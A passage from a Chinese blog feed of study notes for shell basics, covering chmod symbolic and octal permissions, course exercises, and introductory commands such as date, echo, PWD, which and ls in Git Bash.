&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">were&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">given&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">but&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">bits&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">that&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">are&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">set&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">in&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">umask&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">are&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">not&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">affected&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">The&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">operator&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">causes&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">selected&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">mode&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">bits&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">to&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">be&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">added&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">to&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">existing&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">mode&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">bits&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">of&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">each&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">causes&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">them&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">to&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">be&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">removed&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">causes&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">them&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">to&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">be&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">added&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">causes&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">unmentioned&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">bits&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">to&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">be&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">removed&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">except&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">that&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">unmentioned&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">set&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">group&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ID&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">bits&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">are&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">not&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">affected&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">The&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">letters&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">rwxXst&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">mode&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">bits&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">affected&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">w&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">exe&lt;/span>&lt;span class="err">‐&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">cute&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">or&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">directories&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nn">execute/&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">only&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">is&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">or&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">already&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">has&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">execute&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">permission&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">some&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">X&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">set&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">or&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">group&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ID&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">on&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">execution&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">restricted&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">deletion&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">flag&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">or&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sticky&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">bit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Instead&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">of&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">one&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">or&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">more&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">of&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">these&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">letters&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">you&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">can&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">specify&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">exactly&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">one&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">of&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">letters&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ugo&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">permissions&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">granted&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">to&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">who&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">owns&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">u&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">permissions&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">granted&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">to&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">other&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">who&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">are&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">members&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">of&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">group&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">g&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">permissions&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">granted&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">to&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">that&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">are&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">in&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">neither&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">of&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">two&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">preceding&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">cate&lt;/span>&lt;span class="err">‐&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">gories&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">o&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>ugoa&lt;/code> 表示要修改的是哪一类用户的文件权限，其中 u 代表 &lt;em>user 文件所有者&lt;/em>、 g 代表 &lt;em>group 用户组内成员&lt;/em>、o 代表 &lt;em>others 其他用户&lt;/em>， 而 a 代表 &lt;em>all 所有用户&lt;/em> 。 [ugoa] 的方括号告诉我们这一部分可以省略，而 &lt;strong>省略则默认修改所有人的权限&lt;/strong> 。&lt;/p>
&lt;p>&lt;code>[-+=]&lt;/code> 表示要以何种方式修改文件权限。 - 代表删除某权限， + 代表追加某权限 &lt;em>而不影响其他权限&lt;/em>， = 代表直接设置成某权限 &lt;strong>并删除其他权限&lt;/strong>。 比如 -r（删除读取权限）、 +w（增加写入权限）、=r（设置成只可读权限，即增加读取权限，删除执行与写入权限）&lt;/p>
&lt;p>&lt;code>[perms]&lt;/code> 即 permissions，代表要设置的是什么权限：从 字符集&lt;code>rwxXst&lt;/code> 中选择。&lt;/p>
&lt;p>r 代表读取权， w 代表写入权， x 代表执行权。X为特殊执行权限：只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> A numeric mode is from one to four octal digits (0-7), derived by adding up the bits with
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> values 4, 2, and 1. Omitted digits are assumed to be leading zeros. The first digit se‐
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> lects the set user ID (4) and set group ID (2) and restricted deletion or sticky (1) at‐
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> tributes. The second digit selects permissions for the user who owns the file: read (4),
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> write (2), and execute (1); the third selects permissions for other users in the file&amp;#39;s
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> group, with the same values; and the fourth for other users not in the file&amp;#39;s group, with
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> the same values.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>八进制表示是一个三位数。从前到后每一位数都代表了一类用户的文件权限（分别是u、g、o）。数值的确定规则如下：首先将三个不同的权限变成三个数值：4-r, 2-w, x-1。比如 rwx 代表 4+3+1=7, 其八进制表示则是7。r-x 代表 4+0+1=5， &amp;mdash; 代表 0+0+0=0。那么数值 750 就代表了 所有者拥有读取写入执行权、用户组用户拥有读取和执行权，其他用户没有任何权利。&lt;/p>
&lt;p>&lt;img src="https://nepl1t.github.io/image-6.png"
loading="lazy"
alt="chmod参数图解"
>&lt;/p>
&lt;p>使用八进制表示来使用 &lt;code>chmod&lt;/code> 命令的语法为：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">chmod abc file
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>其中a,b,c各为一个数字，分别表示User、Group、及Other的权限。&lt;/p>
&lt;p>r=4，w=2，x=1&lt;/p>
&lt;p>若要 rwx 属性则 4+2+1=7；&lt;/p>
&lt;p>若要 rw- 属性则 4+2=6；&lt;/p>
&lt;p>若要 r-x 属性则 4+1=5。&lt;/p>
&lt;p>例如&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">chmod a=rwx file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chmod =rwx file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chmod 777 file
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>效果相同，都是将 file 的权限都设为 &lt;code>rwxrwxrwx&lt;/code> 。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">chmod ug=rwx,o=x file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chmod 771 file
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>效果相同，都是将 file 的权限设置为 &lt;code>rwxrwx--x&lt;/code>。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> chmod never changes the permissions of symbolic links; the chmod system call cannot change
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> their permissions. This is not a problem since the permissions of symbolic links are
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> never used. However, for each symbolic link listed on the command line, chmod changes the
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> permissions of the pointed-to file. In contrast, chmod ignores symbolic links encountered
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> during recursive directory traversals.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;hr>
&lt;ol start="8">
&lt;li>使用 &lt;code>chmod&lt;/code> 命令改变权限，使 &lt;code>./semester&lt;/code> 能够成功执行，不要使用 &lt;code>sh semester&lt;/code> 来执行该程序。（您的 shell 是如何知晓这个文件需要使用 sh 来解析呢？更多信息请参考：&lt;a class="link" href="https://en.wikipedia.org/wiki/Shebang_%28Unix%29" target="_blank" rel="noopener"
>shebang&lt;/a> ）&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://nepl1t.github.io/image-7.png"
loading="lazy"
alt="嗯"
>&lt;/p>
&lt;ol start="9">
&lt;li>使用 | 和 &amp;gt; ，将 semester 文件输出的最后更改日期信息，写入主目录下的 last-modified.txt 的文件中&lt;/li>
&lt;/ol>
&lt;p>semester 文件输出的最后更改日期信息（last-modified） 可以利用 &lt;code>grep&lt;/code> 命令寻找。&lt;/p>
&lt;p>&lt;img src="https://nepl1t.github.io/image-8.png"
loading="lazy"
alt="哈"
>&lt;/p>
&lt;ol start="10">
&lt;li>写一段命令来从 /sys 中获取笔记本的电量信息，或者台式机 CPU 的温度。注意：macOS 并没有 sysfs，所以 Mac 用户可以跳过这一题。&lt;/li>
&lt;/ol>
&lt;p>solution：&lt;/p>
&lt;ul>
&lt;li>创建一个文件名为 &lt;code>now_battery_capa&lt;/code>，其内容为 &lt;code>cat /sys/class/power_supply/BAT1/capacity&lt;/code> 。&lt;/li>
&lt;li>将其权限设为可执行&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://nepl1t.github.io/image-9.png"
loading="lazy"
alt="笔记本电量100"
>&lt;/p>
&lt;p>可以看出现在笔记本电量为100.&lt;/p></description></item><item><title>MITMS01_课程概述与Shell</title><link>https://nepl1t.github.io/p/mitms01_%E8%AF%BE%E7%A8%8B%E6%A6%82%E8%BF%B0%E4%B8%8Eshell/</link><pubDate>Thu, 02 Nov 2023 16:43:23 +0800</pubDate><guid>https://nepl1t.github.io/p/mitms01_%E8%AF%BE%E7%A8%8B%E6%A6%82%E8%BF%B0%E4%B8%8Eshell/</guid><description>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">本文配置环境为 Windows 11 64位下的 Git Bash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="界面介绍date-echo-pwd-which-命令文件路径">界面介绍，date echo pwd which 命令，文件路径
&lt;/h2>&lt;p>打开终端如下图&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/2TuLFPidGEzcD5Y.png"
loading="lazy"
alt="打开界面"
>&lt;/p>
&lt;p>其告诉你：你的用户名为Azusaislit，主机名为Roboride-Portab&lt;/p>
&lt;p>运行 date 程序，显示出当前时间&lt;/p>
&lt;p>可以在执行运行程序的命令的同时传递参数，比如运行 echo 程序的同时传递参数 Hello，这将会在你的终端输出 Hello&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/ELNOkfhXApiI7rR.png"
loading="lazy"
alt="date与echo指令"
>&lt;/p>
&lt;p>如果希望传递的参数中包含空格（例如一个名为 My Photos 的文件夹），您要么用使用单引号&lt;code>'My Photos'&lt;/code>，双引号将其包裹起来 &lt;code>&amp;quot;My Photos&amp;quot;&lt;/code> ，要么使用转义符号 &lt;code>\&lt;/code> 进行处理（&lt;code>My\ Photos&lt;/code>）。&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/hJ6OWlPdZsvTo1i.png"
loading="lazy"
alt="转义符空格"
>&lt;/p>
&lt;p>&lt;strong>环境变量&lt;/strong> 是 shell 确定程序位置的一个基本方法，它就像编程语言的一种变量（实际上 shell 就是一种编程语言，可以用来编程，后面可以来写脚本）。它是在启动 shell 的时候就已经设置好了的，不需要用户每次手动配置&lt;/p>
&lt;p>&lt;strong>路径变量&lt;/strong> &lt;code>$PATH&lt;/code> 是一类重要的环境变量：如果你要求 shell 执行某个指令，但是该指令并不是 shell 所了解的编程关键字，那么它会去咨询 &lt;em>环境变量&lt;/em> &lt;code>$PATH&lt;/code>，其会列出当 shell 接到某条指令时，进行程序搜索的路径&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/BW5igyx4rUhM8va.png"
loading="lazy"
alt="PATH环境变量"
>&lt;/p>
&lt;p>这是由冒号所分割的路径列表。电脑在&lt;code>$PATH&lt;/code>寻找并尝试匹配你所需要的程序。&lt;/p>
&lt;p>运行程序可以直接输入程序名称，让 shell 从 &lt;code>$PATH&lt;/code> 中寻找它，或者通过程序的&lt;strong>绝对路径&lt;/strong>来运行&lt;/p>
&lt;p>绝对路径是完全可以确定文件位置的路径&lt;/p>
&lt;p>相对路径是&lt;strong>相对你所在路径&lt;/strong>的路径。利用 &lt;code>pwd&lt;/code> 命令可以查看当前所在的路径&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/fM8tC6np9i4wL72.png"
loading="lazy"
alt="pwd命令"
>&lt;/p>
&lt;p>其告诉我我正位于 &lt;code>C:\Users\Azusaislit&lt;/code> 文件夹中（我目前使用Windows系统下的Bash shell）&lt;/p>
&lt;p>而切换目录需要使用 &lt;code>cd&lt;/code> 命令。在路径中，&lt;code>.&lt;/code> 表示的是当前目录，而 &lt;code>..&lt;/code> 表示上级目录&lt;/p>
&lt;p>如果我们想知道所运行的程序是哪一个，我们可使用 &lt;code>which&lt;/code> 命令&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/u1cHqRL6dMaWoGm.png"
loading="lazy"
alt="which命令的使用"
>&lt;/p>
&lt;p>即运行的 &lt;code>echo&lt;/code> 程序位于 &lt;code>/usr/bin/echo&lt;/code>&lt;/p>
&lt;p>在Windows上，每个分区都有一个根目录，每个分区都有一个单独的路径结构： &lt;code>C:\&lt;/code> &lt;code>D:\&lt;/code>，而这样的路径用&lt;strong>反斜杠&lt;/strong>分割&lt;/p>
&lt;p>在Linux和MacOS，所有内容都属于根命名空间内，所有绝对路径都由 &lt;code>/&lt;/code> 开头，路径用&lt;strong>正斜杠&lt;/strong>分割。&lt;/p>
&lt;h2 id="ls命令与文件权限">ls命令与文件权限
&lt;/h2>&lt;p>为了查看指定目录下包含哪些文件，我们使用 &lt;code>ls&lt;/code> 命令：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/gLTv57xzQAuMstk.png"
loading="lazy"
alt="ls命令"
>&lt;/p>
&lt;p>这告诉我们 &lt;code>C:\Users\Azusaislit\Pictures&lt;/code> 路径下的所有文件夹（蓝色字体）与文件（白色字体）
使用 &lt;code>ls -l&lt;/code> 命令会给我们有关这些文件夹与文件的更多信息&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/dUFeaSlBOAWQ3wp.png"
loading="lazy"
alt="更详细的文件显示"
>&lt;/p>
